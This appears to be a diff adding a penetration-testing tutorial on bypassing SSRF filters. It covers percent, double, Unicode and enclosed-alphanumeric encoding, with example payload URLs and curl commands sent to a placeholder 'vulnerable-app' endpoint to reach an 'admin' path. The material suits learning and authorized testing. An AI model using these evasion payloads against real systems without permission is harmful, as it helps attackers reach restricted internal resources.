@@ -1,0 +1,114 @@
+---
+title: Bypass Using Different Encoding Techniques
+description: Learn how to bypass SSRF filters using various encoding techniques in
+  URLs, such as percent, double, and Unicode encoding.
+keywords:
+- SSRF filters
+- encoding techniques
+- percent-encoding
+- double encoding
+- Unicode encoding
+- filter evasion
+- HTTP request
+---
+
+# Bypass Using Different Encoding
+
+## Context
+
+This article provides detailed guidance on bypassing Server-Side Request Forgery (SSRF) filters by employing various encoding techniques. This approach takes advantage of alternative encoding schemes that can disguise restricted keywords or addresses in HTTP requests, allowing them to slip past simplistic filtering mechanisms. To fully appreciate and implement these techniques, you should be familiar with URL encoding, character encoding, HTTP request structure, SSRF, and address trickery.
+
+## Theory
+
+### Encoding Schemes for Filter Evasion
+
+Different encoding techniques play a crucial role in obfuscating restricted payloads:
+
+- **Percent-encoding:** This replaces specific characters with a '%' symbol followed by their hexadecimal ASCII value. For instance, 'a' becomes '%61'.
+- **Double encoding:** Applies percent-encoding twice, such that each character is encoded again. For example, 'a' becomes '%2561'.
+- **Unicode encoding:** Uses Unicode representations to encode characters, such as using '\u0061' to represent 'a'.
+- **Enclosed alphanumeric encoding:** This technique employs Unicode enclosed alphanumerics; for instance, 'A' can appear as U+24B6 or 'Ⓐ'.
+
+### Filter Evasion via Encoding
+
+Filters designed to block particular substrings or addresses might only decode user input once or miss variant encodings entirely:
+
+- **Core Principle:** When input is decoded only once, filters can miss double-encoded or Unicode versions of restricted elements.
+- **Attack Sequence:** Attackers transform usually blacklisted keywords or addresses into less recognizable forms using various encodings.
+- **Filter Bypass Logic:** By converting restricted substrings, attackers can pass unrecognized forms through filters until the backend decodes them.
+
+### Attacker Workflow: Encoding for SSRF
+
+To execute these techniques effectively, attackers should:
+
+1. **Identify** filter logic and pinpoint weaknesses concerning encoding through trial and error.
+2. **Craft** payloads using alternative encodings to obscure restricted substrings or addresses.
+3. **Submit** the encoded payloads carefully and observe how the backend responds to confirm successful filter bypass.
+
+## Practice
+
+### Bypassing SSRF Filters with Percent-Encoding Variants
+
+In situations where a keyword or address is blacklisted, such as 'admin', attackers can use percent-encoding to obfuscate input.
+
+- **Step 1:** Identify a blacklisted keyword or address (e.g., 'admin').
+- **Step 2:** Use the payload format:
+    ```http
+    http://example.com/%61dmin
+    ```
+    Here, '%61' represents 'a', forming 'admin' after decoding.
+- **Step 3:** Execute this using `curl`:
+    ```bash
+    curl 'http://vulnerable-app/ssrf?url=http://example.com/%61dmin'
+    ```
+    This sends the encoded payload to the SSRF endpoint for processing.
+
+### Double Percent-Encoding for Filter Evasion
+
+Double encoding is useful when a single decoding process is applied by the filter.
+
+- **Step 1:** Craft a payload with double percent-encoding:
+    ```http
+    http://example.com/%2561dmin
+    ```
+    Here, '%2561' decodes first to '%61', which then further decodes to 'a'.
+- **Step 2:** Use `curl` to send the request:
+    ```bash
+    curl 'http://vulnerable-app/ssrf?url=http://example.com/%2561dmin'
+    ```
+    Testing if the backend performs double-decoding and bypasses single-decoding filters.
+
+### Unicode Encoding for SSRF Filter Bypass
+
+Unicode encoding involves using Unicode representations to mask characters.
+
+- **Step 1:** Prepare a Unicode-encoded payload:
+    ```http
+    http://example.com/\u0061dmin
+    ```
+    '\u0061' represents 'a'; some backend systems decode this automatically.
+- **Step 2:** Submit the payload using `curl`:
+    ```bash
+    curl 'http://vulnerable-app/ssrf?url=http://example.com/\u0061dmin'
+    ```
+    Observing the backend's behavior when it receives a Unicode-encoded request.
+
+### Enclosed Alphanumeric Unicode Encoding
+
+This encoding is another layer to bypass filters by using alphanumeric Unicode points.
+
+- **Step 1:** Deploy a payload with enclosed alphanumerics:
+    ```http
+    http://example.com/Ⓐdmin
+    ```
+    'Ⓐ' (U+24B6) might be normalized to 'A' by the backend.
+- **Step 2:** Execute using `curl`:
+    ```bash
+    curl 'http://vulnerable-app/ssrf?url=http://example.com/Ⓐdmin'
+    ```
+    This determines whether the backend normalizes these representations into forbidden strings.
+
+## Tools
+
+- **curl** 
+- **Burp Suite** 
